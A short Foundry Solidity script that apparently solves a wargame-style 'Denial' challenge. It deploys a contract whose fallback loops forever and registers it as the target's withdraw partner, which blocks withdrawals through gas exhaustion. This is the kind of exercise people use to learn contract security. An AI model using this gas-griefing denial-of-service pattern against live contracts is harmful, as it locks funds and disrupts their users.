// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script, console} from "forge-std/Script.sol";

contract Solver is Script {
    address denial = vm.envAddress("DENIAL_INSTANCE");

    function setUp() public {}

    function run() public {
        vm.startBroadcast(vm.envUint("PRIV_KEY"));

        MakeDoS malicious_contract = new MakeDoS();

        denial.call(abi.encodeWithSignature("setWithdrawPartner(address)", address(malicious_contract)));

        vm.stopBroadcast();
    }
}

contract MakeDoS {
    fallback() external payable {
        while (true) {
            // Do noting
        }
    }
}